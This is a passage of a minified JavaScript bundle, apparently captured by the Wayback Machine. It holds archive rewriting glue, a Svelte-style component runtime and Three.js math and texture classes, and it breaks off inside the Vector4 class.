var _____WB$wombat$assign$function_____ = function(name) { return self._wb_wombat && self._wb_wombat.local_init && self._wb_wombat.local_init(name) || self[name] };
self.__WB_pmw || (self.__WB_pmw = function(obj) { return this.__WB_source = obj, this }); {
    let window = _____WB$wombat$assign$function_____("window"),
        self = _____WB$wombat$assign$function_____("self"),
        document = _____WB$wombat$assign$function_____("document");
    _____WB$wombat$assign$function_____("location"), _____WB$wombat$assign$function_____("top"), _____WB$wombat$assign$function_____("parent"), _____WB$wombat$assign$function_____("frames"), _____WB$wombat$assign$function_____("opener");
    var app = function() {
        "use strict";

        function e() {}

        function t(e) { return e() }

        function n() { return Object.create(null) }

        function i(e) { e.forEach(t) }

        function r(e) { return "function" == typeof e }

        function a(e, t) { return e != e ? t == t : e !== t || e && "object" == typeof e || "function" == typeof e }

        function o(e, t) { e.appendChild(t) }

        function s(e, t, n) { e.insertBefore(t, n || null) }

        function l(e) { e.parentNode.removeChild(e) }

        function c(e, t) { for (let n = 0; n < e.length; n += 1) e[n] && e[n].d(t) }

        function u(e) { return document.createElement(e) }

        function h(e) { return document.createTextNode(e) }

        function d() { return h(" ") }

        function p(e, t, n, i) { return e.addEventListener(t, n, i), () => e.removeEventListener(t, n, i) }

        function f(e, t, n) { null == n ? e.removeAttribute(t) : e.getAttribute(t) !== n && e.setAttribute(t, n) }

        function m(e, t) { t = "" + t, e.wholeText !== t && (e.data = t) }
        let g;

        function v(e) { g = e }
        const x = [],
            _ = [],
            b = [],
            w = [],
            M = Promise.resolve();
        let T = !1;

        function E(e) { b.push(e) }
        let S = !1;
        const L = new Set;

        function A() {
            if (!S) {
                S = !0;
                do {
                    for (let e = 0; e < x.length; e += 1) {
                        const t = x[e];
                        v(t), R(t.$$)
                    }
                    for (v(null), x.length = 0; _.length;) _.pop()();
                    for (let e = 0; e < b.length; e += 1) {
                        const t = b[e];
                        L.has(t) || (L.add(t), t())
                    }
                    b.length = 0
                } while (x.length);
                for (; w.length;) w.pop()();
                T = !1, S = !1, L.clear()
            }
        }

        function R(e) {
            if (null !== e.fragment) {
                e.update(), i(e.before_update);
                const t = e.dirty;
                e.dirty = [-1], e.fragment && e.fragment.p(e.ctx, t), e.after_update.forEach(E)
            }
        }
        const P = new Set;

        function C(e, t) {-1 === e.$$.dirty[0] && (x.push(e), T || (T = !0, M.then(A)), e.$$.dirty.fill(0)), e.$$.dirty[t / 31 | 0] |= 1 << t % 31 }

        function D(a, o, s, c, u, h, d = [-1]) {
            const p = g;
            v(a);
            const f = a.$$ = { fragment: null, ctx: null, props: h, update: e, not_equal: u, bound: n(), on_mount: [], on_destroy: [], on_disconnect: [], before_update: [], after_update: [], context: new Map(p ? p.$$.context : []), callbacks: n(), dirty: d, skip_bound: !1 };
            let m = !1;
            if (f.ctx = s ? s(a, o.props || {}, ((e, t, ...n) => { const i = n.length ? n[0] : t; return f.ctx && u(f.ctx[e], f.ctx[e] = i) && (!f.skip_bound && f.bound[e] && f.bound[e](i), m && C(a, e)), t })) : [], f.update(), m = !0, i(f.before_update), f.fragment = !!c && c(f.ctx), o.target) {
                if (o.hydrate) {
                    const e = function(e) { return Array.from(e.childNodes) }(o.target);
                    f.fragment && f.fragment.l(e), e.forEach(l)
                } else f.fragment && f.fragment.c();
                o.intro && (y = a.$$.fragment) && y.i && (P.delete(y), y.i(undefined)),
                    function(e, n, a, o) {
                        const { fragment: s, on_mount: l, on_destroy: c, after_update: u } = e.$$;
                        s && s.m(n, a), o || E((() => {
                            const n = l.map(t).filter(r);
                            c ? c.push(...n) : i(n), e.$$.on_mount = []
                        })), u.forEach(E)
                    }(a, o.target, o.anchor, o.customElement), A()
            }
            var y;
            v(p)
        }
        const N = 100,
            I = 1e3,
            O = 1001,
            H = 1002,
            U = 1003,
            F = 1004,
            z = 1005,
            B = 1006,
            G = 1008,
            k = 1009,
            V = 1012,
            W = 1014,
            j = 1015,
            q = 1016,
            X = 1020,
            Y = 1022,
            Z = 1023,
            J = 1026,
            K = 1027,
            $ = 2300,
            Q = 2301,
            te = 3e3,
            ne = 3001,
            ie = 7680,
            re = 35044,
            ae = 35048,
            oe = "300 es";

        function se() {}
        Object.assign(se.prototype, {
            addEventListener: function(e, t) {
                void 0 === this._listeners && (this._listeners = {});
                const n = this._listeners;
                void 0 === n[e] && (n[e] = []), -1 === n[e].indexOf(t) && n[e].push(t)
            },
            hasEventListener: function(e, t) { if (void 0 === this._listeners) return !1; const n = this._listeners; return void 0 !== n[e] && -1 !== n[e].indexOf(t) },
            removeEventListener: function(e, t) { if (void 0 === this._listeners) return; const n = this._listeners[e]; if (void 0 !== n) { const e = n.indexOf(t); - 1 !== e && n.splice(e, 1) } },
            dispatchEvent: function(e) { if (void 0 === this._listeners) return; const t = this._listeners[e.type]; if (void 0 !== t) { e.target = this; const n = t.slice(0); for (let t = 0, i = n.length; t < i; t++) n[t].call(this, e) } }
        });
        const le = [];
        for (let e = 0; e < 256; e++) le[e] = (e < 16 ? "0" : "") + e.toString(16);
        let ce = 1234567;
        const ue = {
            DEG2RAD: Math.PI / 180,
            RAD2DEG: 180 / Math.PI,
            generateUUID: function() {
                const e = 4294967295 * Math.random() | 0,
                    t = 4294967295 * Math.random() | 0,
                    n = 4294967295 * Math.random() | 0,
                    i = 4294967295 * Math.random() | 0;
                return (le[255 & e] + le[e >> 8 & 255] + le[e >> 16 & 255] + le[e >> 24 & 255] + "-" + le[255 & t] + le[t >> 8 & 255] + "-" + le[t >> 16 & 15 | 64] + le[t >> 24 & 255] + "-" + le[63 & n | 128] + le[n >> 8 & 255] + "-" + le[n >> 16 & 255] + le[n >> 24 & 255] + le[255 & i] + le[i >> 8 & 255] + le[i >> 16 & 255] + le[i >> 24 & 255]).toUpperCase()
            },
            clamp: function(e, t, n) { return Math.max(t, Math.min(n, e)) },
            euclideanModulo: function(e, t) { return (e % t + t) % t },
            mapLinear: function(e, t, n, i, r) { return i + (e - t) * (r - i) / (n - t) },
            lerp: function(e, t, n) { return (1 - n) * e + n * t },
            damp: function(e, t, n, i) { return ue.lerp(e, t, 1 - Math.exp(-n * i)) },
            pingpong: function(e, t = 1) { return t - Math.abs(ue.euclideanModulo(e, 2 * t) - t) },
            smoothstep: function(e, t, n) { return e <= t ? 0 : e >= n ? 1 : (e = (e - t) / (n - t)) * e * (3 - 2 * e) },
            smootherstep: function(e, t, n) { return e <= t ? 0 : e >= n ? 1 : (e = (e - t) / (n - t)) * e * e * (e * (6 * e - 15) + 10) },
            randInt: function(e, t) { return e + Math.floor(Math.random() * (t - e + 1)) },
            randFloat: function(e, t) { return e + Math.random() * (t - e) },
            randFloatSpread: function(e) { return e * (.5 - Math.random()) },
            seededRandom: function(e) { return void 0 !== e && (ce = e % 2147483647), ce = 16807 * ce % 2147483647, (ce - 1) / 2147483646 },
            degToRad: function(e) { return e * ue.DEG2RAD },
            radToDeg: function(e) { return e * ue.RAD2DEG },
            isPowerOfTwo: function(e) { return !(e & e - 1) && 0 !== e },
            ceilPowerOfTwo: function(e) { return Math.pow(2, Math.ceil(Math.log(e) / Math.LN2)) },
            floorPowerOfTwo: function(e) { return Math.pow(2, Math.floor(Math.log(e) / Math.LN2)) },
            setQuaternionFromProperEuler: function(e, t, n, i, r) {
                const a = Math.cos,
                    o = Math.sin,
                    s = a(n / 2),
                    l = o(n / 2),
                    c = a((t + i) / 2),
                    u = o((t + i) / 2),
                    h = a((t - i) / 2),
                    d = o((t - i) / 2),
                    p = a((i - t) / 2),
                    f = o((i - t) / 2);
                switch (r) {
                    case "XYX":
                        e.set(s * u, l * h, l * d, s * c);
                        break;
                    case "YZY":
                        e.set(l * d, s * u, l * h, s * c);
                        break;
                    case "ZXZ":
                        e.set(l * h, l * d, s * u, s * c);
                        break;
                    case "XZX":
                        e.set(s * u, l * f, l * p, s * c);
                        break;
                    case "YXY":
                        e.set(l * p, s * u, l * f, s * c);
                        break;
                    case "ZYZ":
                        e.set(l * f, l * p, s * u, s * c);
                        break;
                    default:
                        console.warn("THREE.MathUtils: .setQuaternionFromProperEuler() encountered an unknown order: " + r)
                }
            }
        };
        class he {
            constructor(e = 0, t = 0) { this.x = e, this.y = t }
            get width() { return this.x }
            set width(e) { this.x = e }
            get height() { return this.y }
            set height(e) { this.y = e }
            set(e, t) { return this.x = e, this.y = t, this }
            setScalar(e) { return this.x = e, this.y = e, this }
            setX(e) { return this.x = e, this }
            setY(e) { return this.y = e, this }
            setComponent(e, t) {
                switch (e) {
                    case 0:
                        this.x = t;
                        break;
                    case 1:
                        this.y = t;
                        break;
                    default:
                        throw new Error("index is out of range: " + e)
                }
                return this
            }
            getComponent(e) {
                switch (e) {
                    case 0:
                        return this.x;
                    case 1:
                        return this.y;
                    default:
                        throw new Error("index is out of range: " + e)
                }
            }
            clone() { return new this.constructor(this.x, this.y) }
            copy(e) { return this.x = e.x, this.y = e.y, this }
            add(e, t) { return void 0 !== t ? (console.warn("THREE.Vector2: .add() now only accepts one argument. Use .addVectors( a, b ) instead."), this.addVectors(e, t)) : (this.x += e.x, this.y += e.y, this) }
            addScalar(e) { return this.x += e, this.y += e, this }
            addVectors(e, t) { return this.x = e.x + t.x, this.y = e.y + t.y, this }
            addScaledVector(e, t) { return this.x += e.x * t, this.y += e.y * t, this }
            sub(e, t) { return void 0 !== t ? (console.warn("THREE.Vector2: .sub() now only accepts one argument. Use .subVectors( a, b ) instead."), this.subVectors(e, t)) : (this.x -= e.x, this.y -= e.y, this) }
            subScalar(e) { return this.x -= e, this.y -= e, this }
            subVectors(e, t) { return this.x = e.x - t.x, this.y = e.y - t.y, this }
            multiply(e) { return this.x *= e.x, this.y *= e.y, this }
            multiplyScalar(e) { return this.x *= e, this.y *= e, this }
            divide(e) { return this.x /= e.x, this.y /= e.y, this }
            divideScalar(e) { return this.multiplyScalar(1 / e) }
            applyMatrix3(e) {
                const t = this.x,
                    n = this.y,
                    i = e.elements;
                return this.x = i[0] * t + i[3] * n + i[6], this.y = i[1] * t + i[4] * n + i[7], this
            }
            min(e) { return this.x = Math.min(this.x, e.x), this.y = Math.min(this.y, e.y), this }
            max(e) { return this.x = Math.max(this.x, e.x), this.y = Math.max(this.y, e.y), this }
            clamp(e, t) { return this.x = Math.max(e.x, Math.min(t.x, this.x)), this.y = Math.max(e.y, Math.min(t.y, this.y)), this }
            clampScalar(e, t) { return this.x = Math.max(e, Math.min(t, this.x)), this.y = Math.max(e, Math.min(t, this.y)), this }
            clampLength(e, t) { const n = this.length(); return this.divideScalar(n || 1).multiplyScalar(Math.max(e, Math.min(t, n))) }
            floor() { return this.x = Math.floor(this.x), this.y = Math.floor(this.y), this }
            ceil() { return this.x = Math.ceil(this.x), this.y = Math.ceil(this.y), this }
            round() { return this.x = Math.round(this.x), this.y = Math.round(this.y), this }
            roundToZero() { return this.x = this.x < 0 ? Math.ceil(this.x) : Math.floor(this.x), this.y = this.y < 0 ? Math.ceil(this.y) : Math.floor(this.y), this }
            negate() { return this.x = -this.x, this.y = -this.y, this }
            dot(e) { return this.x * e.x + this.y * e.y }
            cross(e) { return this.x * e.y - this.y * e.x }
            lengthSq() { return this.x * this.x + this.y * this.y }
            length() { return Math.sqrt(this.x * this.x + this.y * this.y) }
            manhattanLength() { return Math.abs(this.x) + Math.abs(this.y) }
            normalize() { return this.divideScalar(this.length() || 1) }
            angle() { return Math.atan2(-this.y, -this.x) + Math.PI }
            distanceTo(e) { return Math.sqrt(this.distanceToSquared(e)) }
            distanceToSquared(e) {
                const t = this.x - e.x,
                    n = this.y - e.y;
                return t * t + n * n
            }
            manhattanDistanceTo(e) { return Math.abs(this.x - e.x) + Math.abs(this.y - e.y) }
            setLength(e) { return this.normalize().multiplyScalar(e) }
            lerp(e, t) { return this.x += (e.x - this.x) * t, this.y += (e.y - this.y) * t, this }
            lerpVectors(e, t, n) { return this.x = e.x + (t.x - e.x) * n, this.y = e.y + (t.y - e.y) * n, this }
            equals(e) { return e.x === this.x && e.y === this.y }
            fromArray(e, t = 0) { return this.x = e[t], this.y = e[t + 1], this }
            toArray(e = [], t = 0) { return e[t] = this.x, e[t + 1] = this.y, e }
            fromBufferAttribute(e, t, n) { return void 0 !== n && console.warn("THREE.Vector2: offset has been removed from .fromBufferAttribute()."), this.x = e.getX(t), this.y = e.getY(t), this }
            rotateAround(e, t) {
                const n = Math.cos(t),
                    i = Math.sin(t),
                    r = this.x - e.x,
                    a = this.y - e.y;
                return this.x = r * n - a * i + e.x, this.y = r * i + a * n + e.y, this
            }
            random() { return this.x = Math.random(), this.y = Math.random(), this }
        }
        he.prototype.isVector2 = !0;
        class de {
            constructor() { this.elements = [1, 0, 0, 0, 1, 0, 0, 0, 1], arguments.length > 0 && console.error("THREE.Matrix3: the constructor no longer reads arguments. use .set() instead.") }
            set(e, t, n, i, r, a, o, s, l) { const c = this.elements; return c[0] = e, c[1] = i, c[2] = o, c[3] = t, c[4] = r, c[5] = s, c[6] = n, c[7] = a, c[8] = l, this }
            identity() { return this.set(1, 0, 0, 0, 1, 0, 0, 0, 1), this }
            copy(e) {
                const t = this.elements,
                    n = e.elements;
                return t[0] = n[0], t[1] = n[1], t[2] = n[2], t[3] = n[3], t[4] = n[4], t[5] = n[5], t[6] = n[6], t[7] = n[7], t[8] = n[8], this
            }
            extractBasis(e, t, n) { return e.setFromMatrix3Column(this, 0), t.setFromMatrix3Column(this, 1), n.setFromMatrix3Column(this, 2), this }
            setFromMatrix4(e) { const t = e.elements; return this.set(t[0], t[4], t[8], t[1], t[5], t[9], t[2], t[6], t[10]), this }
            multiply(e) { return this.multiplyMatrices(this, e) }
            premultiply(e) { return this.multiplyMatrices(e, this) }
            multiplyMatrices(e, t) {
                const n = e.elements,
                    i = t.elements,
                    r = this.elements,
                    a = n[0],
                    o = n[3],
                    s = n[6],
                    l = n[1],
                    c = n[4],
                    u = n[7],
                    h = n[2],
                    d = n[5],
                    p = n[8],
                    f = i[0],
                    m = i[3],
                    g = i[6],
                    v = i[1],
                    y = i[4],
                    x = i[7],
                    _ = i[2],
                    b = i[5],
                    w = i[8];
                return r[0] = a * f + o * v + s * _, r[3] = a * m + o * y + s * b, r[6] = a * g + o * x + s * w, r[1] = l * f + c * v + u * _, r[4] = l * m + c * y + u * b, r[7] = l * g + c * x + u * w, r[2] = h * f + d * v + p * _, r[5] = h * m + d * y + p * b, r[8] = h * g + d * x + p * w, this
            }
            multiplyScalar(e) { const t = this.elements; return t[0] *= e, t[3] *= e, t[6] *= e, t[1] *= e, t[4] *= e, t[7] *= e, t[2] *= e, t[5] *= e, t[8] *= e, this }
            determinant() {
                const e = this.elements,
                    t = e[0],
                    n = e[1],
                    i = e[2],
                    r = e[3],
                    a = e[4],
                    o = e[5],
                    s = e[6],
                    l = e[7],
                    c = e[8];
                return t * a * c - t * o * l - n * r * c + n * o * s + i * r * l - i * a * s
            }
            invert() {
                const e = this.elements,
                    t = e[0],
                    n = e[1],
                    i = e[2],
                    r = e[3],
                    a = e[4],
                    o = e[5],
                    s = e[6],
                    l = e[7],
                    c = e[8],
                    u = c * a - o * l,
                    h = o * s - c * r,
                    d = l * r - a * s,
                    p = t * u + n * h + i * d;
                if (0 === p) return this.set(0, 0, 0, 0, 0, 0, 0, 0, 0);
                const f = 1 / p;
                return e[0] = u * f, e[1] = (i * l - c * n) * f, e[2] = (o * n - i * a) * f, e[3] = h * f, e[4] = (c * t - i * s) * f, e[5] = (i * r - o * t) * f, e[6] = d * f, e[7] = (n * s - l * t) * f, e[8] = (a * t - n * r) * f, this
            }
            transpose() { let e; const t = this.elements; return e = t[1], t[1] = t[3], t[3] = e, e = t[2], t[2] = t[6], t[6] = e, e = t[5], t[5] = t[7], t[7] = e, this }
            getNormalMatrix(e) { return this.setFromMatrix4(e).invert().transpose() }
            transposeIntoArray(e) { const t = this.elements; return e[0] = t[0], e[1] = t[3], e[2] = t[6], e[3] = t[1], e[4] = t[4], e[5] = t[7], e[6] = t[2], e[7] = t[5], e[8] = t[8], this }
            setUvTransform(e, t, n, i, r, a, o) {
                const s = Math.cos(r),
                    l = Math.sin(r);
                return this.set(n * s, n * l, -n * (s * a + l * o) + a + e, -i * l, i * s, -i * (-l * a + s * o) + o + t, 0, 0, 1), this
            }
            scale(e, t) { const n = this.elements; return n[0] *= e, n[3] *= e, n[6] *= e, n[1] *= t, n[4] *= t, n[7] *= t, this }
            rotate(e) {
                const t = Math.cos(e),
                    n = Math.sin(e),
                    i = this.elements,
                    r = i[0],
                    a = i[3],
                    o = i[6],
                    s = i[1],
                    l = i[4],
                    c = i[7];
                return i[0] = t * r + n * s, i[3] = t * a + n * l, i[6] = t * o + n * c, i[1] = -n * r + t * s, i[4] = -n * a + t * l, i[7] = -n * o + t * c, this
            }
            translate(e, t) { const n = this.elements; return n[0] += e * n[2], n[3] += e * n[5], n[6] += e * n[8], n[1] += t * n[2], n[4] += t * n[5], n[7] += t * n[8], this }
            equals(e) {
                const t = this.elements,
                    n = e.elements;
                for (let e = 0; e < 9; e++)
                    if (t[e] !== n[e]) return !1;
                return !0
            }
            fromArray(e, t = 0) { for (let n = 0; n < 9; n++) this.elements[n] = e[n + t]; return this }
            toArray(e = [], t = 0) { const n = this.elements; return e[t] = n[0], e[t + 1] = n[1], e[t + 2] = n[2], e[t + 3] = n[3], e[t + 4] = n[4], e[t + 5] = n[5], e[t + 6] = n[6], e[t + 7] = n[7], e[t + 8] = n[8], e }
            clone() { return (new this.constructor).fromArray(this.elements) }
        }
        let pe;
        de.prototype.isMatrix3 = !0;
        const fe = {
            getDataURL: function(e) {
                if (/^data:/i.test(e.src)) return e.src;
                if ("undefined" == typeof HTMLCanvasElement) return e.src;
                let t;
                if (e instanceof HTMLCanvasElement) t = e;
                else {
                    void 0 === pe && (pe = document.createElementNS("http://www.w3.org/1999/xhtml", "canvas")), pe.width = e.width, pe.height = e.height;
                    const n = pe.getContext("2d");
                    e instanceof ImageData ? n.putImageData(e, 0, 0) : n.drawImage(e, 0, 0, e.width, e.height), t = pe
                }
                return t.width > 2048 || t.height > 2048 ? t.toDataURL("image/jpeg", .6) : t.toDataURL("image/png")
            }
        };
        let me = 0;
        class ge extends se {
            constructor(e = ge.DEFAULT_IMAGE, t = ge.DEFAULT_MAPPING, n = 1001, i = 1001, r = 1006, a = 1008, o = 1023, s = 1009, l = 1, c = 3e3) { super(), Object.defineProperty(this, "id", { value: me++ }), this.uuid = ue.generateUUID(), this.name = "", this.image = e, this.mipmaps = [], this.mapping = t, this.wrapS = n, this.wrapT = i, this.magFilter = r, this.minFilter = a, this.anisotropy = l, this.format = o, this.internalFormat = null, this.type = s, this.offset = new he(0, 0), this.repeat = new he(1, 1), this.center = new he(0, 0), this.rotation = 0, this.matrixAutoUpdate = !0, this.matrix = new de, this.generateMipmaps = !0, this.premultiplyAlpha = !1, this.flipY = !0, this.unpackAlignment = 4, this.encoding = c, this.version = 0, this.onUpdate = null }
            updateMatrix() { this.matrix.setUvTransform(this.offset.x, this.offset.y, this.repeat.x, this.repeat.y, this.rotation, this.center.x, this.center.y) }
            clone() { return (new this.constructor).copy(this) }
            copy(e) { return this.name = e.name, this.image = e.image, this.mipmaps = e.mipmaps.slice(0), this.mapping = e.mapping, this.wrapS = e.wrapS, this.wrapT = e.wrapT, this.magFilter = e.magFilter, this.minFilter = e.minFilter, this.anisotropy = e.anisotropy, this.format = e.format, this.internalFormat = e.internalFormat, this.type = e.type, this.offset.copy(e.offset), this.repeat.copy(e.repeat), this.center.copy(e.center), this.rotation = e.rotation, this.matrixAutoUpdate = e.matrixAutoUpdate, this.matrix.copy(e.matrix), this.generateMipmaps = e.generateMipmaps, this.premultiplyAlpha = e.premultiplyAlpha, this.flipY = e.flipY, this.unpackAlignment = e.unpackAlignment, this.encoding = e.encoding, this }
            toJSON(e) {
                const t = void 0 === e || "string" == typeof e;
                if (!t && void 0 !== e.textures[this.uuid]) return e.textures[this.uuid];
                const n = { metadata: { version: 4.5, type: "Texture", generator: "Texture.toJSON" }, uuid: this.uuid, name: this.name, mapping: this.mapping, repeat: [this.repeat.x, this.repeat.y], offset: [this.offset.x, this.offset.y], center: [this.center.x, this.center.y], rotation: this.rotation, wrap: [this.wrapS, this.wrapT], format: this.format, type: this.type, encoding: this.encoding, minFilter: this.minFilter, magFilter: this.magFilter, anisotropy: this.anisotropy, flipY: this.flipY, premultiplyAlpha: this.premultiplyAlpha, unpackAlignment: this.unpackAlignment };
                if (void 0 !== this.image) {
                    const i = this.image;
                    if (void 0 === i.uuid && (i.uuid = ue.generateUUID()), !t && void 0 === e.images[i.uuid]) {
                        let t;
                        if (Array.isArray(i)) { t = []; for (let e = 0, n = i.length; e < n; e++) i[e].isDataTexture ? t.push(ve(i[e].image)) : t.push(ve(i[e])) } else t = ve(i);
                        e.images[i.uuid] = { uuid: i.uuid, url: t }
                    }
                    n.image = i.uuid
                }
                return t || (e.textures[this.uuid] = n), n
            }
            dispose() { this.dispatchEvent({ type: "dispose" }) }
            transformUv(e) {
                if (300 !== this.mapping) return e;
                if (e.applyMatrix3(this.matrix), e.x < 0 || e.x > 1) switch (this.wrapS) {
                    case I:
                        e.x = e.x - Math.floor(e.x);
                        break;
                    case O:
                        e.x = e.x < 0 ? 0 : 1;
                        break;
                    case H:
                        1 === Math.abs(Math.floor(e.x) % 2) ? e.x = Math.ceil(e.x) - e.x : e.x = e.x - Math.floor(e.x)
                }
                if (e.y < 0 || e.y > 1) switch (this.wrapT) {
                    case I:
                        e.y = e.y - Math.floor(e.y);
                        break;
                    case O:
                        e.y = e.y < 0 ? 0 : 1;
                        break;
                    case H:
                        1 === Math.abs(Math.floor(e.y) % 2) ? e.y = Math.ceil(e.y) - e.y : e.y = e.y - Math.floor(e.y)
                }
                return this.flipY && (e.y = 1 - e.y), e
            }
            set needsUpdate(e) {!0 === e && this.version++ }
        }

        function ve(e) { return "undefined" != typeof HTMLImageElement && e instanceof HTMLImageElement || "undefined" != typeof HTMLCanvasElement && e instanceof HTMLCanvasElement || "undefined" != typeof ImageBitmap && e instanceof ImageBitmap ? fe.getDataURL(e) : e.data ? { data: Array.prototype.slice.call(e.data), width: e.width, height: e.height, type: e.data.constructor.name } : (console.warn("THREE.Texture: Unable to serialize Texture."), {}) }
        ge.DEFAULT_IMAGE = void 0, ge.DEFAULT_MAPPING = 300, ge.prototype.isTexture = !0;
        class ye {
            constructor(e = 0, t = 0, n = 0, i = 1) { this.x = e, this.y = t, this.z = n, this.w = i }
            get width() { return this.z }
            set width(e) { this.z = e }
            get height() { return this.w }
            set height(e) { this.w = e }
            set(e, t, n, i) { return this.x = e, this.y = t, this.z = n, this.w = i, this }
            setScalar(e) { return this.x = e, this.y = e, this.z = e, this.w = e, this }
            setX(e) { return this.x = e, this }
            setY(e) { return this.y = e, this }
            setZ(e) { return this.z = e, this }
            setW(e) { return this.w = e, this }
            setComponent(e, t) {
                switch (e) {
                    case 0:
                        this.x = t;
                        break;
                    case 1:
                        this.y = t;
                        break;
                    case 2:
                        this.z = t;
                        break;
                    case 3:
                        this.w = t;
                        break;
                    default:
                        throw new Error("index is out of range: " + e)
                }
                return this
            }
            getComponent(e) {
                switch (e) {
                    case 0:
                        return this.x;
                    case 1:
                        return this.y;
                    case 2:
                        return this.z;
                    case 3:
                        return this.w;
                    default:
                        throw new Error("index is out of range: " + e)
                }
            }
            clone() { return new this.constructor(this.x, this.y, this.z, this.w) }
            copy(e) { return this.x = e.x, this.y = e.y, this.z = e.z, this.w = void 0 !== e.w ? e.w : 1, this }
            add(e, t) { return void 0 !== t ? (console.warn("THREE.Vector4: .add() now only accepts one argument. Use .addVectors( a, b ) instead."), this.addVectors(e, t)) : (this.x += e.x, this.y += e.y, this.z += e.z, this.w += e.w, this) }
            addScalar(e) { return this.x += e, this.y += e, this.z += e, this.w += e, this }
            addVectors(e, t) { return this.x = e.x + t.x, this.y = e.y + t.y, this.z = e.z + t.z, this.w = e.w + t.w, this }
            addScaledVector(e, t) { return this.x += e.x * t, this.y += e.y * t, this.z += e.z * t, this.w += e.w * t, this }
            sub(e, t) { return void 0 !== t ? (console.warn("THREE.Vector4: .sub() now only accepts one argument. Use .subVectors( a, b ) instead."), this.subVectors(e, t)) : (this.x -= e.x, this.y -= e.y, this.z -= e.z, this.w -= e.w, this) }
            subScalar(e) { return this.x -= e, this.y -= e, this.z -= e, this.w -= e, this }
            subVectors(e, t) { return this.x = e.x - t.x, this.y = e.y - t.y, this.z = e.z - t.z, this.w = e.w - t.w, this }
            multiply(e) { return this.x *= e.x, this.y *= e.y, this.z *= e.z, this.w *= e.w, this }
            multiplyScalar(e) { return this.x *= e, this.y *= e, this.z *= e, this.w *= e, this }
            applyMatrix4(e) {
                const t = this.x,
                    n = this.y,
                    i = this.z,
                    r = this.w,
                    a = e.elements;
                return this.x = a[0] * t + a[4] * n + a[8] * i + a[12] * r, this.y = a[1] * t + a[5] * n + a[9] * i + a[13] * r, this.z = a[2] * t + a[6] * n + a[10] * i + a[14] * r, this.w = a[3] * t + a[7] * n + a[11] * i + a[15] * r, this
            }
            divideScalar(e) { return this.multiplyScalar(1 / e) }
            setAxisAngleFromQuaternion(e) { this.w = 2 * Math.acos(e.w); const t = Math.sqrt(1 - e.w * e.w); return t < 1e-4 ? (this.x = 1, this.y = 0, this.z = 0) : (this.x = e.x / t, this.y = e.y / t, this.z = e.z / t), this }
            setAxisAngleFromRotationMatrix(e) {
                let t, n, i, r;
                const a = .01,
                    o = .1,
                    s = e.elements,
                    l = s[0],
                    c = s[4],
                    u = s[8],
                    h = s[1],
                    d = s[5],
                    p = s[9],
                    f = s[2],
                    m = s[6],
                    g = s[10];
                if (Math.abs(c - h) < a && Math.abs(u - f) < a && Math.abs(p - m) < a) {
                    if (Math.abs(c + h) < o && Math.abs(u + f) < o && Math.abs(p + m) < o && Math.abs(l + d + g - 3) < o) return this.set(1, 0, 0, 0), this;
                    t = Math.PI;
                    const e = (l + 1) / 2,
                        s = (d + 1) / 2,
                        v = (g + 1) / 2,
                        y = (c + h) / 4,
                        x = (u + f) / 4,
                        _ = (p + m) / 4;
                    return e > s && e > v ? e < a ? (n = 0, i = .707106781, r = .707106781) : (n = Math.sqrt(e), i = y / n, r = x / n) : s > v ? s < a ? (n = .707106781, i = 0, r = .707106781) : (i = Math.sqrt(s), n = y / i, r = _ / i) : v < a ? (n = .707106781, i = .707106781, r = 0) : (r = Math.sqrt(v), n = x / r, i = _ / r), this.set(n, i, r, t), this
                }
                let v = Math.sqrt((m - p) * (m - p) + (u - f) * (u - f) + (h - c) * (h - c));
                return Math.abs(v) < .001 && (v = 1), this.x = (m - p) / v, this.y = (u - f) / v, this.z = (h - c) / v, this.w = Math.acos((l + d + g - 1) / 2), this
            }
            min(e) { return this.x = Math.min(this.x, e.x), this.y = Math.min(this.y, e.y), this.z = Math.min(this.z, e.z), this.w = Math.min(this.w, e.w), this }
            max(e) { return this.x = Math.max(this.x, e.x), this.y = Math.max(this.y, e.y), this.z = Math.max(this.z, e.z), this.w = Math.max(this.w, e.w), this }
            clamp(e, t) { return this.x = Math.max(e.x, Math.min(t.x, this.x)), this.y = Math.max(e.y, Math.min(t.y, this.y)), this.z = Math.max(e.z, Math.min(t.z, this.z)), this.w = Math.max(e.w, Math.min(t.w, this.w)), this }
            clampScalar(e, t) { return this.x = Math.max(e, Math.min(t, this.x)), this.y = Math.max(e, Math.min(t, this.y)), this.z = Math.max(e, Math.min(t, this.z)), this.w = Math.max(e, Math.min(t, this.w)), this }
            clampLength(e, t) { const n = this.length(); return this.divideScalar(n || 1).multiplyScalar(Math.max(e, Math.min(t, n))) }
            floor() { return this.x = Math.floor(this.x), this.y = Math.floor(this.y), this.z = Math.floor(this.z), this.w = Math.floor(this.w), this }
            ceil() { return this.x = Math.ceil(this.x), this.y = Math.ceil(this.y), this.z = Math.ceil(this.z), this.w = Math.ceil(this.w), this }
            round() { return this.x = Math.round(this.x), this.y = Math.round(this.y), this.z = Math.round(this.z), this.w = Math.round(this.w), this }
            roundToZero() { return this.x = this.x < 0 ? Math.ceil(this.x) : Math.floor(this.x), this.y = this.y < 0 ? Math.ceil(this.y) : Math.floor(this.y), this.z = this.z < 0 ? Math.ceil(this.z) : Math.floor(this.z), this.w = this.w < 0 ? Math.ceil(this.w) : Math.floor(this.w), this }
            negate() { return this.x = -this.x, this.y = -this.y, this.z = -this.z, this.w = -this.w, this }
            dot(e) { return this.x * e.x + this.y * e.y + this.z * e.z + this.w * e.w }
            lengthSq() { return this.x * this.x + this.y * this.y + this.z * this.z + this.w * this.w }
            length() { return Math.sqrt(this.x * this.x + this.y * this.y + this.z * this.z + this.w * this.w) }
            manhattanLength() { return Math.abs(this.x) + Math.abs(this.y) + Math.abs(this.z) + Math.abs(this.w) }
            normalize() { return this.divideScalar(this.length() || 1) }
            setLength(e) { return this.normalize().multiplyScalar(e) }
            lerp(e, t) { return this.x += (e.x - this.x) * t, this.y += (e.y - this.y) * t, this.z += (e.z - this.z) * t, this.w += (e.w - this.w) * t, this }
            lerpVectors(e, t, n) { return this.x = e.x + (t.x - e.x) * n, this.y = e.y + (t.y - e.y) * n, this.z = e.z + (t.z - e.z) * n, this.w = e.w + (t.w - e.w) * n, this }
            equals(e) { return e.x === this.x && e.y === this.y && e.z === this.z && e.w === this.w }
            fromArray(e, t = 0) { return this.x = e[t], this.y = e[t + 1], this.z = e[t + 2], this.w = e[t + 3], this }
            toArray(e = [], t = 0) { return e[t] = this.x, e[t + 1] = this.y, e[t + 2] = this.z, e[t + 3] = this.w, e }
            fromBufferAttribute(e, t, n) { return void 0 !== n && console.warn("THREE.Vector4: offset has been removed from .fromBufferAttribute()."), this.x = e.getX(t), this.y = e.getY(t), this.z = e.getZ(t), this.w = e.getW(t), this }
